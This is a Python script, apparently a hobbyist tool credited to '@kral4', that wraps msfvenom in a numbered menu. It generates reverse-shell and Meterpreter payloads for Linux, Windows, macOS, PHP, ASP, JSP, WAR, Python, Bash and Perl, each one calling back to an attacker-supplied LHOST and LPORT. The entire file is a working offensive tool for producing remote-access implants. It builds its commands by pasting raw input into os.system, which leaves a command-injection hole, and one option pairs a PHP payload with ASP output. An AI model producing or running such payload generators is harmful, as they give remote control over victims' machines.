import os
from termcolor import colored

print(colored("@kral4 Msfvenom Payload Generator", "magenta"))
print(colored("*" * 25, "blue"),colored("\n** 1 : Linux Payload", "blue"),colored("\n** 2 : Windows Payload", "blue"),colored("\n** 3 : Mac Payload", "blue"),colored("\n** 4 : Php Payload", "blue"),colored("\n** 5 : Asp Payload", "blue"),colored("\n** 6 : JSP Payload", "blue"),colored("\n** 7 : War Payload", "blue"),colored("\n** 8 : Python Payload", "blue"),colored("\n** 9 : Bash Payload", "blue"),colored("\n** 0 : Perl Payload", "blue"),"\n" + colored("*" * 25, "blue"))
choice = input(colored("Your Selection :", "cyan"))
if choice == "1":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf > payload.elf")
		print(colored("Created ! payload.elf", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "2":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe > payload.exe")
		print(colored("Created ! payload.exe", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "3":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f macho > payload.macho")
		print(colored("Created ! payload.macho", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "4":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.php")
		print(colored("Created ! payload.php", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "5":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f asp > payload.asp")
		print(colored("Created ! payload.asp", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "6":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.jsp")
		print(colored("Created ! payload.jsp", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "7":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f war > payload.war")
		print(colored("Created ! payload.war", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "8":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p cmd/unix/reverse_python LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.py")
		print(colored("Created ! payload.py", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "9":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p cmd/unix/reverse_bash LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.sh")
		print(colored("Created ! payload.sh", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
elif choice == "0":
	try:
		lhost = input(colored("LHOST (e.g. 1.1.1.1):", "red"))
		lport = input(colored("LPORT (e.g. 4444):", "red"))
		print(colored("Please Wait ...", "green"))
		os.system("msfvenom -p cmd/unix/reverse_perl LHOST=" + lhost + " LPORT=" + lport + " -f raw > payload.pl")
		print(colored("Created ! payload.pl", "green"))
	except:
		print(colored("Failed !", "red"))
		pass
